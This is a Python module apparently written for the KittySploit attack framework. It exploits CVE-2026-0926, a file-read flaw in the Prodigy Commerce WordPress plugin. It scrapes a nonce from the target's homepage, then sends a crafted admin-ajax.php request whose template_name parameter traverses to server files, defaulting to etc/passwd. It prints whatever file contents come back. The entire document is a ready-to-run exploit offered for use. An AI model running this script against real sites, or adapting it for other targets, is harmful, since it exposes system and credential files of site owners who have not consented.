#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Prodigy Commerce CVE-2026-0926 — admin-ajax template_name LFI."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Prodigy Commerce CVE-2026-0926 LFI",
        "description": "File read via parameters[template_name] on prodigy-render-my-account-widget.",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-0926"],
        "tags": ["wordpress", "prodigy-commerce", "lfi", "auxiliary", "cve-2026-0926"],
    }

    path = OptString("/", "WordPress base path", required=False)
    template_name = OptString("etc/passwd", "template_name traversal target", required=False)
    _NONCE = re.compile(r'"nonce"\s*:\s*"([a-f0-9]+)"')

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        m = self._NONCE.search(home.text or "") if home else None
        if not m:
            print_error("Prodigy nonce not found on homepage")
            return False
        tpl = (self.template_name or "etc/passwd").strip()
        data = (
            f"action=prodigy-render-my-account-widget&nonce={m.group(1)}"
            f"&parameters[template_name]={tpl}&parameters[default_path]=/"
        )
        r = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data,
            allow_redirects=False,
        )
        if not r:
            print_error("Request failed")
            return False
        print_status((r.text or "")[:2500])
        return True
